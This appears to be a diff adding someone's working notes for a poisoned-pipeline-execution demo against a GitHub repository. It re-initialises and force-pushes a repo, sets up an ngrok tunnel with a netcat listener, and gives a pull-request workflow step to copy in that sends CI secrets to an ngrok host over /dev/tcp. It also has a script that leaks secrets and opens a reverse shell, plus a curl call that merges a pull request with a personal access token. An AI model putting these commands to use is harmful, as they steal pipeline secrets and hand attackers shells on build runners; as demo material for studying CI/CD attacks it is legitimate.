@@ -1,0 +1,45 @@
+
+rmdir /s .git
+git init
+git config --global init.defaultBranch main
+git add .
+git commit -m "Initial commit"
+git remote add origin https://github.com/lgvorg1/cicd_top10_1
+git push -u --force origin main
+
+
+ngrok tcp 1000
+sudo nc -lvk 1000
+
+
+pr.yml:
+============
+      # Simulation of a compilation
+      - name: Building ... 
+        run: |
+          mkdir ./bin
+          touch ./bin/mybin.exe# Simulation of a compilation
+          ### COPY THESE 2 LINES ##########
+          echo ------- D-PPE From user [${{ github.event.pull_request.user.login }}] in pr [${{ github.workflow }}] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/7.tcp.eu.ngrok.io/18280
+          #echo "echo D-PPE from pr.yml > ./runtests.out" >> ./runtests.sh 
+          #echo "echo ------- D-PPE From user [${{ github.event.pull_request.user.login }}] in pr [${{ github.workflow }}] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/4.tcp.eu.ngrok.io/10129" >> ./runtests.sh
+          #################################
+
+
+
+
+echo " echo D-PPE > ./runtests.out" > ./runtests.sh 
+echo " echo Execution from WRITE user > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh
+echo " env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh 
+
+
+echo " bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/18328 0>&1" >> ./runtests.sh 
+
+
+curl -L \
+                  -X PUT \
+                  -H "Accept: application/vnd.github+json" \
+                  -H "Authorization: Bearer $GITHUB_PAT" \
+                  -H "X-GitHub-Api-Version: 2022-11-28" \
+                  https://api.github.com/repos/lgvorg1/cicd_top10_1/pulls/35/merge \
+                  -d '{"commit_title":"Expand enum","commit_message":"Add a new value to the merge_method enum"}'
